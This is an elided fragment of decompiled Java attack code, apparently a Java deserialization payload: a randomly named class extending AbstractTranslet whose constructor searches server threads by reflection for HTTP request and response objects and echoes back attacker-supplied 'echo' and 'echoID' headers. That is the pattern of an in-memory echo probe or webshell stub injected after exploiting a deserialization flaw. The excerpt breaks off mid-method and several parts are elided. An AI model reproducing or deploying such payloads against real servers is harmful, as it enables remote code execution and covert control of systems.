...
public class Fooo8VtwSYFU extends AbstractTranslet {
   ...
   public Fooo8VtwSYFU() throws Exception {
      boolean var4 = false;
            ...
            if (!var3.contains("exec") && var3.contains("http")) {
               ...
               if (var1 instanceof Runnable) {
                  ...
                  for(int var10 = 0; var10 < var9.size(); ++var10) {
                     ...
                     var3 = (String)var1.getClass().getMethod("getHeader", String.class).invoke(var1, "echo");
                     if (var3 != null && !var3.isEmpty()) {
                        var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
                        var2.getClass().getMethod("addHeader", String.class, String.class).invoke(var2, "echo", var3);
                        var4 = true;
                     }

                     var3 = (String)var1.getClass().getMethod("getHeader", String.class).invoke(var1, "echoID");
                     if (var3 != null && !var3.isEmpty()) {
                        var2.getClass().getMethod("setStatus", Integer.TYPE).invoke(var2, new Integer(200));
